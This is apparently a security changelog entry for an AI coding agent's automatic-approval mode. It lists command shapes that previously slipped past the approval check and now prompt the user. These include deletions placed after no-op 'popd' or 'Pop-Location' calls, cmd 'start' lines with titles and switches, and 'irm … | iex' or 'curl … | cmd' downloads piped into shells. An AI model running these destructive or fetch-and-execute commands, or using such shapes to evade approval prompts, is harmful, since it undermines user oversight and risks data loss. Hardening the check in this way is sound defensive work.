---
section: security
---

- **Auto no longer runs a deletion after a pop that doesn't change directory, a cmd `start "title" …`, or a download piped into a shell inside `Start-Process`.** `pushd /etc; popd -n; rm -rf x`, `popd foo`, a `popd` after `dirs -c`, and `Push-Location C:\Windows; Pop-Location -Bogus; Remove-Item x -Recurse` stay where they are, so they ask like the same delete without the pop; a plain `popd` or `Pop-Location` (also `-PassThru`) still goes back. `start "" /b reg add …`, `start "title" /wait …` and `start "" /d C:\ cmd /c rd /s /q x` are read through the title and the switches, as `start /b reg add …` already was. `Start-Process powershell -ArgumentList '-c','irm https://x/y.ps1 | iex'` (also `pwsh`, `cmd`, `bash`, `saps`) asks as a script piped into a shell. `curl … | cmd` is now one too.
